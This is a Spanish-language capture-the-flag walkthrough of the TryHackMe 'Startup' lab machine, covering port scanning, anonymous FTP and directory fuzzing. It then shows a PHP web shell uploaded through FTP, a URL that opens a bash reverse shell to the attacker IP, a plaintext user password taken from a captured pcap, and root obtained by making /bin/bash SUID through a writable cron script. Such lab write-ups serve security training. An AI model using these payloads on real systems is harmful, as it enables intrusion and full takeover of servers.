___
# Startup Machine | THM

IP atacante: 192.168.192.200
IP víctima: 10.129.166.144

Comprobamos conectividad con la máquina

![[startup_ping.png]]

TTL = 62 -> Máquina Linux

___

# Reconocimiento y enumeración

Realizamos un escaneo de puertos con nmap para ver cuáles están abiertos

![[startup_nmap.png]]

![[startup_servicesv.png]]

[+] Puertos abiertos
	-> 21 | FTP | vsftpd 3.0.3
	-> 22 | SSH | OpenSSH 7.2p2
	-> 80 | HTTP | Apache httpd 2.4.18

El acceso a FTP como anonymous está habilitado, entramos y encontramos dos archivos que contienen información. Los traemos al equipo para ver su contenido, pero no tienen nada importante.

![[startup_ftp.png]]

Ahora realizamos un fuzzing a la web de la página para enumerar directorios expuestos y ver su contenido.

![[startup_ffuf.png]]

Encontramos `/files`

![[startup_files.png]]

Ya que es el mismo contenido que encontramos en el servicio FTP, tratamos de subir un payload en la carpeta `/ftp` para mandarnos una reverse_shell.

```php
<?php
	system($_GET['cmd']);
?>
```

```url
http://10.129.166.144/files/ftp/payload_php.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26/dev/tcp/192.168.192.200/443%200%3E%261%22
```

![[startup_revershell.png]]

Aplicamos un tratamiento de tty y buscamos el `ingrediente secreto` que es: `love`

![[startup_recipe.png]]

Dentro de la raíz, encontramos el directorio incidents y un archivo `.pcapng`, el cual nos traemos a nuestra máquina por el servicio FTP para examinarlo con la herramienta ``wireshark``

![[startup_pcapng.png]]

![[startup_ftppcapng.png]]

Ahora abrimos wireshark y el archivo

![[startup_passlennie.png]]

`lennie`:c4ntg3t3n0ughsp1c3

Cambiamos de usuario a `lennie` y obtenemos la flag del user en su home

![[startup_flaguser.png]]

También tiene una carpeta Documents y scripts, esta última nos interesa.

![[startup_scripts.png]]

Podemos ver que `planner.sh` ejecuta un script llamado `print.sh` (esto nos hace pensar en un crontab que se ejecuta cada X tiempo), el cual es propiedad de `lennie` y puede escribir en él. Entonces cambiamos el contenido de dicho archivo con lo siguiente para agregarle permiso SUID.

```bash
chmod u+s /bin/bash
```

Monitorizamos el proceso con `watch`, cambia y lanzamos una bash con privilegios con `bash -p` y obtenemos la flag del root

![[startup_flagroot.png]]